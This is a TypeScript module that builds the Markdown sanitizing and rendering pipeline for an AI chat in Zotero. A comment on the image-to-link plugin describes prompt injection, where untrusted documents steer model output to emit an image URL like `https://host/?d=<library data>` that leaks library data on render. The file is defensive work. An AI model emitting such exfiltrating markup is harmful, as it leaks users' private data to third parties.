/**
 * The Markdown grammar and HTML rules the chat renders with: source
 * preprocessing, the remark and rehype plugin lists, the sanitize schema and
 * the URL transforms. The chat's React renderer and the note renderer
 * (`noteHtml.ts`) both build their pipeline from these, so a note is written
 * with exactly the markup the chat shows.
 *
 * Nothing here imports React or reads a DOM.
 */

import type { PluggableList } from 'unified';
import remarkGfm from 'remark-gfm';
import remarkMath from 'remark-math';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
import { itemLinkExportHref } from '@beaver/agent-core/identity/itemLinks';
import { processPartialContent } from './partialContent';
import { unwrapLegacyNoteTags } from './legacyNoteTags';
import { classNames, hastTextContent, type HastNode } from './hast';
import { rehypeNoteTextDirection, type TextDirectionOptions } from './textDirection';


const citationDataAttributes = [
    'data-library-id', 'dataLibraryId',
    'data-library-ref', 'dataLibraryRef',
    'data-zotero-key', 'dataZoteroKey',
    'data-external-id', 'dataExternalId',
    'data-external-source', 'dataExternalSource',
    'data-ext-key', 'dataExtKey',
    'data-loc', 'dataLoc',
    'data-loc-kind', 'dataLocKind',
    'data-loc-value', 'dataLocValue',
    'data-requested-citation-key', 'dataRequestedCitationKey',
    'data-resolved-citation-key', 'dataResolvedCitationKey',
    'data-consecutive', 'dataConsecutive',
    'data-adjacent', 'dataAdjacent',
    'data-invalid-reason', 'dataInvalidReason',
    'data-raw-identity', 'dataRawIdentity',
    'data-identity-attr', 'dataIdentityAttr',
];

// `<picture>`/`<source>` would load a remote `srcSet`, which neither the
// sanitizer's protocol check nor the URL transform covers. Images are replaced
// by `rehypeImagesAsLinks`.
const blockedTagNames = new Set(['picture', 'source']);

/**
 * GitHub's sanitize schema, extended to keep normalized citation tags and
 * `zotero://` links.
 */
export const markdownSanitizeSchema = {
    ...defaultSchema,
    attributes: {
        ...defaultSchema.attributes,
        citation: citationDataAttributes,
    },
    protocols: {
        ...defaultSchema.protocols,
        href: [...(defaultSchema.protocols?.href || []), 'zotero'],
    },
    tagNames: [
        ...(defaultSchema.tagNames || []).filter((tagName) => !blockedTagNames.has(tagName)),
        'citation',
    ],
};

/**
 * Rehype plugin that writes math in Zotero's note format instead of rendering
 * it with KaTeX.
 *
 * After remark-math and rehype-sanitize, math nodes are
 *   - inline:  `<code class="language-math">content</code>`
 *   - display: `<pre><code class="language-math">content</code></pre>`
 * and become
 *   - inline:  `<span class="math">$content$</span>`
 *   - display: `<pre class="math">$$content$$</pre>`
 */
export function rehypeZoteroMath() {
    return (tree: HastNode) => {
        transformMathNodes(tree);
    };
}

function transformMathNodes(node: HastNode): void {
    if (!node.children) return;

    for (const child of node.children) {
        if (child.type !== 'element') continue;

        // Display math: <pre><code class="language-math">content</code></pre>
        if (child.tagName === 'pre' && child.children?.length === 1) {
            const codeChild = child.children[0];
            if (codeChild.type === 'element' && codeChild.tagName === 'code' && classNames(codeChild).includes('language-math')) {
                const mathContent = hastTextContent(codeChild);
                child.properties = { className: ['math'] };
                child.children = [{ type: 'text', value: `$$${mathContent}$$` }];
                continue;
            }
        }

        // Inline math: <code class="language-math">content</code>
        if (child.tagName === 'code' && classNames(child).includes('language-math')) {
            const mathContent = hastTextContent(child);
            child.tagName = 'span';
            child.properties = { className: ['math'] };
            child.children = [{ type: 'text', value: `$${mathContent}$` }];
            continue;
        }

        transformMathNodes(child);
    }
}

function hasProperty(node: HastNode, name: string): boolean {
    return node.type === 'element' && node.properties?.[name] !== undefined;
}

/**
 * Rehype plugin that replaces every image with a link to it.
 *
 * Markdown comes from model output, which can be steered by untrusted content
 * the agent reads (PDFs, web pages, shared notes). A remote image loads as soon
 * as it renders, so an injected `![](https://host/?d=<library data>)` would
 * send data to a third party without any user action. As a link, the URL is
 * only fetched when the user clicks it. An image that is already inside a link
 * becomes its label text, so the outer link stays the only destination.
 * Exports apply the same rule, since notes load images too.
 */
export function rehypeImagesAsLinks() {
    return (tree: HastNode) => {
        replaceImages(tree, false);
    };
}

function replaceImages(node: HastNode, insideLink: boolean): void {
    if (!node.children) return;
    const childrenInsideLink = insideLink || (node.type === 'element' && node.tagName === 'a');
    node.children = node.children.flatMap((child): HastNode[] => {
        if (child.type !== 'element' || child.tagName !== 'img') {
            replaceImages(child, childrenInsideLink);
            return [child];
        }
        const { src, alt, title } = child.properties ?? {};
        const href = typeof src === 'string' ? src : '';
        const label = (typeof alt === 'string' && alt) || href;
        if (!label) return [];
        const text: HastNode = { type: 'text', value: label };
        if (childrenInsideLink || !href) return [text];
        const properties: Record<string, unknown> = { href };
        if (typeof title === 'string' && title) properties.title = title;
        return [{ type: 'element', tagName: 'a', properties, children: [text] }];
    });
}

/**
 * Rehype plugin that rewrites GFM footnotes as endnotes a Zotero note can
 * hold. The note editor has no footnotes and drops in-note anchors, so the
 * chat's footnote markup would leave a "Footnotes" heading, dead links and
 * "↩" back-references in the note. Instead:
 *   - a reference `<sup><a href="#fn-1">1</a></sup>` becomes `<sup>1</sup>`;
 *   - the definitions section becomes a "Notes" heading followed by its
 *     numbered list, without the back-references.
 */
export function rehypeZoteroNoteFootnotes() {
    return (tree: HastNode) => {
        transformFootnotes(tree);
    };
}

function transformFootnotes(node: HastNode): void {
    if (!node.children) return;
    const children: HastNode[] = [];
    let removedBackref = false;
    // A removed back-reference leaves the space that preceded it.
    const trimTrailingSpace = () => {
        while (children.length > 0) {
            const last = children[children.length - 1];
            if (last.type !== 'text') return;
            last.value = (last.value ?? '').replace(/\s+$/, '');
            if (last.value) return;
            children.pop();
        }
    };
    for (const child of node.children) {
        if (hasProperty(child, 'dataFootnoteRef')) {
            // The reference's number, without the in-note link.
            children.push(...(child.children ?? []));
            continue;
        }
        if (hasProperty(child, 'dataFootnoteBackref')) {
            trimTrailingSpace();
            removedBackref = true;
            continue;
        }
        // Whitespace between removed back-references.
        if (removedBackref && child.type === 'text' && !(child.value ?? '').trim()) continue;
        if (child.type === 'element' && child.tagName === 'section' && hasProperty(child, 'dataFootnotes')) {
            const list = (child.children ?? []).find((grandchild) => grandchild.type === 'element' && grandchild.tagName === 'ol');
            if (!list) continue;
            transformFootnotes(list);
            for (const item of list.children ?? []) {
                if (item.type === 'element') item.properties = {};
            }
            children.push(
                { type: 'element', tagName: 'h2', properties: {}, children: [{ type: 'text', value: 'Notes' }] },
                { type: 'text', value: '\n' },
                list,
            );
            continue;
        }
        transformFootnotes(child);
        children.push(child);
    }
    if (removedBackref) trimTrailingSpace();
    node.children = children;
}

const safeProtocol = /^(https?|ircs?|mailto|xmpp)$/i;

/**
 * react-markdown's default URL policy: relative URLs and the protocols in
 * `safeProtocol` pass, anything else (`javascript:`, `data:`, …) becomes empty.
 */
function defaultUrlTransform(value: string): string {
    const colon = value.indexOf(':');
    const questionMark = value.indexOf('?');
    const numberSign = value.indexOf('#');
    const slash = value.indexOf('/');
    if (
        colon === -1
        || (slash !== -1 && colon > slash)
        || (questionMark !== -1 && colon > questionMark)
        || (numberSign !== -1 && colon > numberSign)
        || safeProtocol.test(value.slice(0, colon))
    ) {
        return value;
    }
    return '';
}

/** The chat's URL policy: the default one, plus `zotero://` links. */
export function markdownUrlTransform(url: string): string {
    if (url.startsWith('zotero://')) return url;
    return defaultUrlTransform(url);
}

/**
 * The URL policy of rendering saved into a Zotero note, where a bare object id
 * (`u-KEY`) is not a working href: item links are written as `zotero://select`
 * URIs the note editor can follow.
 */
export function exportUrlTransform(url: string): string {
    return itemLinkExportHref(url) ?? markdownUrlTransform(url);
}

/**
 * Remark plugins, in order. Strikethrough needs `~~`: models write subscripts
 * as `P~lac~` and approximations as `~5`, which single tildes would strike.
 */
export const markdownRemarkPlugins: PluggableList = [remarkMath, [remarkGfm, { singleTilde: false }]];

/** Rehype plugins that parse raw HTML, sanitize it and defuse images. They run first. */
export const markdownSanitizePlugins: PluggableList = [
    rehypeRaw,
    [rehypeSanitize, markdownSanitizeSchema],
    rehypeImagesAsLinks,
];

/**
 * Rehype plugins that follow `markdownSanitizePlugins` when rendering for a
 * Zotero note.
 *
 * @param textDirection Give blocks their own text direction
 *     (`rehypeNoteTextDirection`), for a note being written. Without it the
 *     note's blocks take the reader's interface direction.
 */
export function noteRehypePlugins(textDirection?: TextDirectionOptions): PluggableList {
    if (!textDirection) return [rehypeZoteroMath, rehypeZoteroNoteFootnotes];
    return [rehypeZoteroMath, [rehypeNoteTextDirection, textDirection], rehypeZoteroNoteFootnotes];
}

/**
 * Prepare model Markdown for the parser: complete or drop fragments a stream
 * cuts off, replace legacy `<note>` sections, normalize citation tags with the
 * host's `preprocessCitations`, and rewrite `\(…\)` / `\[…\]` math
 * delimiters as dollars.
 */
export function prepareMarkdownSource(
    content: string,
    options: { exportRendering: boolean; preprocessCitations?: (text: string) => string },
): string {
    let markdown = processPartialContent(content, options.exportRendering);
    // Threads predating the `create_note` tool still carry `<note>` sections.
    markdown = unwrapLegacyNoteTags(markdown);
    if (options.preprocessCitations) markdown = options.preprocessCitations(markdown);
    return markdown
        .replace(/```plaintext\s*([\s\S]*?)\s*```/, '$1')
        .replace(/(?<!\\)\\\(((?:\\.|[^\\])*?)\\\)/g, (_, match) => `$${match}$`)
        .replace(/(?<!\\)\\\[((?:\\.|[^\\])*?)\\\]/g, (_, match) => `$$${match}$$`)
        .replace(/\$\$([^$]+)\$\$/g, (_, equation) => `\n$$\n${equation.trim()}\n$$\n`);
}
